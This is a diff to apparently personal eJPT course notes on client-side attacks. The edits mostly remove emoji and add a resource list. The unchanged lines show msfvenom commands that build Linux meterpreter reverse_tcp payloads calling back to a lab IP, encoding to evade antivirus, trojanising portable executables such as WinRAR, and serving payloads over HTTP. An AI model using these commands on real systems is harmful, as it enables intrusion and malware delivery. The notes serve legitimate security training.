@@ -9,7 +9,7 @@ A **client-side attack** is a security breach that happens on the client side.
 * The payload is stored on the client's system
 * Attackers have to pay attention to Anti Virus detection
 
-> ❗ _**Advanced modern antivirus solutions detects and blocks this type of payloads very easily.**_
+>  _**Advanced modern antivirus solutions detects and blocks this type of payloads very easily.**_
 
 ### ​[Msfvenom](https://www.offsec.com/metasploit-unleashed/msfvenom/) Payloads <a href="#msfvenom-payloads" id="msfvenom-payloads"></a>
 
@@ -51,7 +51,7 @@ msfvenom --list formatsFramework Executable Formats \[--format \<value>]========
 
 **32bit payload:**msfvenom -p linux/x86/meterpreter/reverse\_tcp LHOST=192.168.31.128 LPORT=1234 -f elf > /home/kali/certs/ejpt/Linux\_Payloads/payloadx86**64bit payload:**msfvenom -p linux/x64/meterpreter/reverse\_tcp LHOST=192.168.31.128 LPORT=1234 -f elf > /home/kali/certs/ejpt/Linux\_Payloads/payloadx64
 
-* 📌 _Platform and architecture are auto selected if not specified, based on the selected payload_
+*  _Platform and architecture are auto selected if not specified, based on the selected payload_
 
 The transferring method onto the target system depends on the type of the social engineering technique.
 
@@ -78,14 +78,14 @@ Same example with the `linux/x86/meterpreter/reverse_tcp` Linux payload executed
 
 Signature based Antivirus solutions can detect malicious files or executables. Older AV solutions can be evaded by **encoding** the payloads.
 
-* ❗ _This kind of attack vector is outdated and hardly used today_.
+*  _This kind of attack vector is outdated and hardly used today_.
 * May work on legacy old O.S. like Windows 7 or older.
 
-🗒️ Payload **Encoding** involves changing the payload shellcode _with the aim of changing the payload signature_.
+ Payload **Encoding** involves changing the payload shellcode _with the aim of changing the payload signature_.
 
 * ​[Encoding will not always avoid detection](https://docs.rapid7.com/metasploit/encoded-payloads-bypassing-anti-virus)​
 
-🗒️ **Shellcode** is the code typically used as a _payload_ for exploitation, that provides with a remote _command shell_ on the target system.msfvenom --list encodersmsfvenom --list encoders
+ **Shellcode** is the code typically used as a _payload_ for exploitation, that provides with a remote _command shell_ on the target system.msfvenom --list encodersmsfvenom --list encoders
 
 
 
@@ -118,13 +118,13 @@ cd /home/kali/certs/ejpt/Windows\_Payloadssudo python -m http.server 8080msfcons
 
 
 
-> 📌 Modern antivirus detects and blocks the encoded payload as soon as the download is started:​​
+>  Modern antivirus detects and blocks the encoded payload as soon as the download is started:​​
 
 
 
 ### Injecting Payloads into PEs <a href="#injecting-payloads-into-pes" id="injecting-payloads-into-pes"></a>
 
-🗒️ [Windows **Portable Executable**](https://blog.syselement.com/ine/courses/ejpt/hostnetwork-penetration-testing/3-metasploit) (**PE**) _is a file format for executables, object code, DLLs and others, used in 32-bit and 64-bit Windows O.S._
+ [Windows **Portable Executable**](https://blog.syselement.com/ine/courses/ejpt/hostnetwork-penetration-testing/3-metasploit) (**PE**) _is a file format for executables, object code, DLLs and others, used in 32-bit and 64-bit Windows O.S._
 
 * Download a portable executable, **`e.g.`** [WinRAR](https://www.win-rar.com/download.html)​
 * Payloads can be injected into PEs with `msfvenom` with the **`-x`** and **`-k`** options
@@ -168,7 +168,7 @@ msfconsole -q -r handler.rcmsfconsole -q -r handler.rc**`e.g. 2`**nano portscan.
 
 
 
-* 📌 Load up a resource script from within the `msfconsole` with the **`resource`** command
+*  Load up a resource script from within the `msfconsole` with the **`resource`** command
 
 resource /home/kali/certs/ejpt/resource\_scripts/handler.rc
 
@@ -177,3 +177,10 @@ resource /home/kali/certs/ejpt/resource\_scripts/handler.rc
 makerc /home/kali/certs/ejpt/resource\_scripts/portscan2.rc
 
 
+
+
+## Resources
+
+- [MSFvenom documentation](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html)
+- [Kali Metasploit package information](https://www.kali.org/tools/metasploit-framework/)
+- [MITRE ATT&CK: Phishing](https://attack.mitre.org/techniques/T1566/)
